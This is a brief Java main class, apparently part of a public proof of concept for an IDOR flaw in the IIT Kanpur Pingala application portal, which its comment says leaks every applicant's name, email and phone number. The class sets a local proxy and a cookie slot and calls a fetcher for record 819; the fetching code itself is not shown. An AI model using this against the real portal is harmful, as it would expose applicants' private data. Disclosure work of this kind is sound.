import java.net.InetSocketAddress;
import java.net.ProxySelector;

public class Main {
    /*
    Public PoC of IDOR vulnerability in IIT Kanpur Pingala Application Portal that leaks name, email, phone number of all applicants.
     */
    public static ProxySelector proxySelector = ProxySelector.of(
            new InetSocketAddress("localhost", 8080)
    );
    public static String cookie = "";
    public static void main(String[] args)throws Exception{
        Fetcher.fetchInfo(819);
    }
}
